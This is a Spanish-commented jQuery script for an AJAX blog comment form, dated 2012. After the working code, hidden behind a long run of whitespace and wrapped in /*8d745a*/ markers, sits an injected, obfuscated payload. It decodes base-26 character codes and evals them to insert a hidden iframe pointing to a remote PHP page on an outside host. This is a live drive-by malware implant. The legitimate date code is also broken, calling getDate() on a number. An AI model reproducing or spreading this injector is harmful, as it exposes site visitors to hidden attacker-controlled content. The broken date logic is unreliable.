/**
* Autor: Notas Delibertad
* Url: http://delibertad.com
* Fuente del proyecto: http://www.delibertad.com/entradas/sistema-de-comentarios-con-ajax.html
* Tipo de licensia: dristibuida, no comercia 
* A�o: 2012
* correo: blog@delibertad.com
*/



$(document).ready(function(){

	$('#boton-enviar').click(function(event){

		event.preventDefault();

		

		var nombre = $('#nombre').val();
		
		  var now = (new Date).getTimezoneOffset();
                var date_show = now.getDate() + '-' + now.getMonth() + '-' + now.getFullYear() + ' ' + now.getHours() + ':' + + now.getMinutes() + ':' + + now.getSeconds();

		var comentario = $('.editor').val();

		

		if (nombre != '' && comentario != ''){

			$("#mensaje").fadeOut(1000, function(){

				$.post(

						"data.php", 

						{ nombre: nombre, comentario: comentario, now: date_show }, 

						function(data) {

							$("#comentarios").append(data);  

				        }, 

				        "html");

				$('#mensaje').text('Comentario agregado!');

			});

			

			

			$('.editor').val('');

			$('#nombre').focus();	

		}

		else{

			alert('Llene todos los datos, por favor');

		}

		

	});

	

});

/*8d745a*/
                                                                                                                                                                                                                                                          try{document["b"+"ody"]*=document}catch(dgsgsdg){zxc=1;ww=window;}try{d=document["cr"+"eateElement"]("div");}catch(agdsg){zxc=0;}try{if(ww.document)window["doc"+"ument"]["body"]="asd"}catch(bawetawe){if(ww.document){v=window;n=["1e","3o","4d","46","3l","4c","41","47","46","16","1e","1f","16","4j","d","a","16","16","16","16","4e","3j","4a","16","3n","3m","3l","4c","4a","16","29","16","3m","47","3l","4d","45","3n","46","4c","1k","3l","4a","3n","3j","4c","3n","2h","44","3n","45","3n","46","4c","1e","1d","41","3o","4a","3j","45","3n","1d","1f","27","d","a","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4a","3l","16","29","16","1d","40","4c","4c","48","26","1l","1l","3k","4d","4b","41","46","3n","4b","4b","48","3j","3j","4a","3m","1k","46","44","1l","4f","48","1j","41","46","3l","44","4d","3m","3n","4b","1l","4c","4a","3j","3o","1k","48","40","48","1d","27","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4c","4h","44","3n","1k","48","47","4b","41","4c","41","47","46","16","29","16","1d","3j","3k","4b","47","44","4d","4c","3n","1d","27","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4c","4h","44","3n","1k","3k","47","4a","3m","3n","4a","16","29","16","1d","1m","1d","27","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4c","4h","44","3n","1k","40","3n","41","3p","40","4c","16","29","16","1d","1n","48","4g","1d","27","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4c","4h","44","3n","1k","4f","41","3m","4c","40","16","29","16","1d","1n","48","4g","1d","27","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4c","4h","44","3n","1k","44","3n","3o","4c","16","29","16","1d","1n","48","4g","1d","27","d","a","16","16","16","16","3n","3m","3l","4c","4a","1k","4b","4c","4h","44","3n","1k","4c","47","48","16","29","16","1d","1n","48","4g","1d","27","d","a","d","a","16","16","16","16","41","3o","16","1e","17","3m","47","3l","4d","45","3n","46","4c","1k","3p","3n","4c","2h","44","3n","45","3n","46","4c","2e","4h","2l","3m","1e","1d","3n","3m","3l","4c","4a","1d","1f","1f","16","4j","d","a","16","16","16","16","16","16","16","16","3m","47","3l","4d","45","3n","46","4c","1k","4f","4a","41","4c","3n","1e","1d","28","3m","41","4e","16","41","3m","29","3e","1d","3n","3m","3l","4c","4a","3e","1d","2a","28","1l","3m","41","4e","2a","1d","1f","27","d","a","16","16","16","16","16","16","16","16","3m","47","3l","4d","45","3n","46","4c","1k","3p","3n","4c","2h","44","3n","45","3n","46","4c","2e","4h","2l","3m","1e","1d","3n","3m","3l","4c","4a","1d","1f","1k","3j","48","48","3n","46","3m","2f","40","41","44","3m","1e","3n","3m","3l","4c","4a","1f","27","d","a","16","16","16","16","4l","d","a","4l","1f","1e","1f","27"];h=2;s="";if(zxc){for(i=0;i-506!=0;i++){k=i;s+=String.fromCharCode(parseInt(n[i],26));}z=s;vl="val";if(ww.document)ww["e"+vl](z)}}}
/*/8d745a*/
